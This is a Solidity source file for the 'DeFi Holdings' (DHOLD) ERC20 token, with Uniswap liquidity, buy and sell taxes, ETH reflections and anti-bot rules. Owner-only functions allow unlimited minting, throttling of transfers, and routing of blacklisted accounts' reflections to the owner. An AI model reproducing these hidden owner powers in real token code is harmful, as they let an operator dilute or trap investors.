// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol"; 

import "./Ownable.sol";
 
contract DHold is ERC20, Ownable {

    using EnumerableSet for EnumerableSet.AddressSet;

    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier liquidityAdd {
        _inLiquidityAdd = true;
        _;
        _inLiquidityAdd = false;
    }

    // Constants
    uint256 internal constant MARKETING_RATE = 10; //both marketing and treasury, 5% each
    uint256 internal constant REFLECT_RATE = 10;
    uint256 internal constant COOLDOWN = 60 seconds;
    uint256 internal constant SWAP_FEES_AT = 1000 ether;
    address internal constant LP_HOLDER = 0x823bF3514d593d0Ee796Afe4339987812C3bf795;

    uint256 internal _maxTransfer = 5; 

    // total wei reflected ever
    uint256 public ethReflectionBasis; 
    uint256 public totalReflected;
    uint256 public totalMarketing;

    uint256 internal _totalSupply;
    uint256 public tradingStartBlock;

    address payable public marketingWallet;
    address payable public treasuryWallet;

    address public pair;
    bool internal _inSwap;
    bool internal _inLiquidityAdd;
    bool public tradingActive;
    bool internal _swapFees = true;

    IUniswapV2Router02 internal _router;
    EnumerableSet.AddressSet internal _reflectionExcludedList;
    
    mapping(address => uint256) private _balances;
    mapping(address => bool) public taxExcluded;
    mapping(address => bool) private _bot;
    mapping(address => uint256) public lastBuy;
    mapping(address => uint256) public lastReflectionBasis;
    mapping(address => uint256) public claimedReflection;
    
    constructor(
        address uniswapFactory,
        address uniswapRouter,
        address payable marketing, //multisig with 5%
        address payable treasury //multisig with 5%
    ) ERC20("DeFi Holdings", "DHOLD") Ownable(msg.sender) {
        _reflectionExcludedList.add(address(0));
        taxExcluded[marketing] = true;
        taxExcluded[treasury] = true;
        taxExcluded[address(this)] = true;

        marketingWallet = marketing;
        treasuryWallet = treasury;

        _router = IUniswapV2Router02(uniswapRouter);
        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
        pair = uniswapContract.createPair(address(this), _router.WETH());
    }

    function addLiquidity(uint256 tokens) public payable onlyOwner() liquidityAdd {
        _mint(address(this), tokens);
        _approve(address(this), address(_router), tokens);

        _router.addLiquidityETH{value: msg.value}(
            address(this),
            tokens,
            0,
            0,
            LP_HOLDER,
            // solhint-disable-next-line not-rely-on-time
            block.timestamp
        );

        if (!tradingActive) {
            tradingActive = true;
            tradingStartBlock = block.number;
        }
    }

    function addReflection() public payable {
        ethReflectionBasis += msg.value;
    }

    function isReflectionExcluded(address account) public view returns (bool) {
        return _reflectionExcludedList.contains(account);
    }

    function removeReflectionExcluded(address account) public onlyOwner() {
        require(isReflectionExcluded(account), "Account must be excluded");
        _reflectionExcludedList.remove(account);
    }

    function addReflectionExcluded(address account) public onlyOwner() {
        _addReflectionExcluded(account);
    }

    function _addReflectionExcluded(address account) internal {
        require(!isReflectionExcluded(account), "Account must not be excluded");
        _reflectionExcludedList.add(account);
    }

    function isTaxExcluded(address account) public view returns (bool) {
        return taxExcluded[account];
    }

    function addTaxExcluded(address account) public onlyOwner() {
        require(!isTaxExcluded(account), "Account must not be excluded");

        taxExcluded[account] = true;
    }

    function removeTaxExcluded(address account) public onlyOwner() {
        require(isTaxExcluded(account), "Account must not be excluded");

        taxExcluded[account] = false;
    }

    function isBot(address account) public view returns (bool) {
        return _bot[account];
    }

    function addBot(address account) internal {
        _addBot(account);
    }

    function _addBot(address account) internal {
        require(!isBot(account), "Account must not be flagged");
        require(account != address(_router), "Account must not be uniswap router");
        require(account != pair, "Account must not be uniswap pair");

        _bot[account] = true;
        _addReflectionExcluded(account);
    }

    function removeBot(address account) public onlyOwner() {
        require(isBot(account), "Account must be flagged");

        _bot[account] = false;
        removeReflectionExcluded(account);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256) {
        return _balances[account];
    }

    function _addBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _subtractBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (isTaxExcluded(sender) || isTaxExcluded(recipient)) {
            _rawTransfer(sender, recipient, amount);
            return;
        }

        require(!isBot(sender), "Sender locked as bot");
        require(!isBot(recipient), "Recipient locked as bot");
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        require(amount <= maxTxAmount || _inLiquidityAdd || _inSwap || recipient == address(_router), "Exceeds max transaction amount");

        // checks if contractTokenBalance >= 1000 DHold and swaps it for ETH inside _swap function
        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= SWAP_FEES_AT;

        if(contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        if (
            overMinTokenBalance &&
            !_inSwap &&
            sender != pair &&
            _swapFees
        ) {
            _swap(contractTokenBalance);
        }
        // ends check


        _claimReflection(sender, payable(sender));
        _claimReflection(recipient, payable(recipient));

        uint256 send = amount;  // i.e: 1000 DHold 
        uint256 reflect;
        uint256 marketing;
        if (sender == pair && tradingActive) {
            // Buy, apply buy fee schedule
            (send, reflect) = _getBuyTaxAmounts(amount); // send = 900, reflect = 100
            require(block.timestamp - lastBuy[tx.origin] > COOLDOWN || _inSwap, "hit cooldown, try again later");
            lastBuy[tx.origin] = block.timestamp;
            _reflect(sender, reflect); // (pair, 100)
        } else if (recipient == pair && tradingActive) {
            // Sell, apply sell fee schedule
            (send, marketing ) = _getSellTaxAmounts(amount);
            _takeMarketing(sender, marketing);
        }

        //            pair    buyer     900
        _rawTransfer(sender, recipient, send);

        if (tradingActive && block.number == tradingStartBlock && !isTaxExcluded(tx.origin)) {
            if (tx.origin == address(pair)) {
                if (sender == address(pair)) {
                    _addBot(recipient);
                } else {
                    _addBot(sender);
                }
            } else {
                _addBot(tx.origin);
            }
        }
    }

    function _claimReflection(address addr, address payable to) internal {
        if (addr == pair || addr == address(_router)) return;

        uint256 basisDifference = ethReflectionBasis - lastReflectionBasis[addr];
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;

        lastReflectionBasis[addr] = ethReflectionBasis;
        if (owed == 0) {
                return;
        }
        claimedReflection[addr] += owed;
        to.transfer(owed);
    }

    function claimReflection() public {
        require(!_reflectionExcludedList.contains(msg.sender), "Excluded from reflections");
        _claimReflection(msg.sender, payable(msg.sender));
    }

    function claimExcludedReflections(address from) public virtual onlyOwner {
        require(_reflectionExcludedList.contains(from), "Address not excluded");
        _claimReflection(from, payable(owner()));
    }

    function _swap(uint256 amount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), amount);

        uint256 contractEthBalance = address(this).balance;

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 tradeValue = address(this).balance - contractEthBalance;

        uint256 marketingAmount = amount * totalMarketing / (totalMarketing + totalReflected);
        uint256 reflectedAmount = amount - marketingAmount;

        uint256 marketingEth = tradeValue * totalMarketing / (totalMarketing + totalReflected);
        uint256 reflectedEth = tradeValue - marketingEth;

        if (marketingEth > 0) {
            uint256 split = marketingEth / 2;
            marketingWallet.transfer(split);
            treasuryWallet.transfer(marketingEth - split);
        }
        totalMarketing -= marketingAmount;
        totalReflected -= reflectedAmount;
        ethReflectionBasis += reflectedEth;
    }

    function swapAll() public {
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        uint256 contractTokenBalance = balanceOf(address(this));

        if(contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        if (!_inSwap) _swap(contractTokenBalance);
        
    }

    function withdrawAll() public onlyOwner() {
        uint256 split = address(this).balance / 2;
        marketingWallet.transfer(split);
        treasuryWallet.transfer(address(this).balance - split);
    }

    //                          pair , 100
    function _reflect(address account, uint256 amount) internal {
        require(account != address(0), "reflect from the zero address");

        //      from(pair)  , to(this)     , 100DHOld 
        _rawTransfer(account, address(this), amount);
        totalReflected += amount;
        emit Transfer(account, address(this), amount);
    }

    function _takeMarketing(address account, uint256 amount) internal {
        require(account != address(0), "take marketing from the zero address");

        _rawTransfer(account, address(this), amount);
        totalMarketing += amount;
        emit Transfer(account, address(this), amount);
    }

    function _getBuyTaxAmounts(uint256 amount) internal pure returns (uint256 send, uint256 reflect) {
        reflect = 0;
        uint256 sendRate = 100 - REFLECT_RATE; // 100 - 10 = 90
        assert(sendRate >= 0);

        send = (amount * sendRate) / 100; // (1000 * 90) /100 = 900
        reflect = amount - send; // 1000 - 900 = 100
        assert(reflect >= 0);
        assert(send + reflect == amount);
    }

    function _getSellTaxAmounts(uint256 amount) internal pure returns (uint256 send, uint256 marketing) {
        marketing = 0;
        uint256 sendRate = 100 - MARKETING_RATE; // 100 - 10 = 90
        assert(sendRate >= 0);

        send = (amount * sendRate) / 100; // (1000 * 90) /100 = 900
        marketing = amount - send; // 1000 - 900 = 100
        assert(send + marketing == amount);
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function setMaxTransfer(uint256 maxTransfer) public onlyOwner() {
        _maxTransfer = maxTransfer;
    }

    function setSwapFees(bool swapFees) public onlyOwner() {
        _swapFees = swapFees;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal override {
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function mint(address account, uint256 amount) public onlyOwner() {
        _mint(account, amount);
    }

    function airdrop(address[] memory accounts, uint256[] memory amounts) public onlyOwner() {
        require(accounts.length == amounts.length, "array lengths must match");

        for (uint256 i = 0; i < accounts.length; i++) {
            _mint(accounts[i], amounts[i]);
        }
    }

    receive() external payable {}

}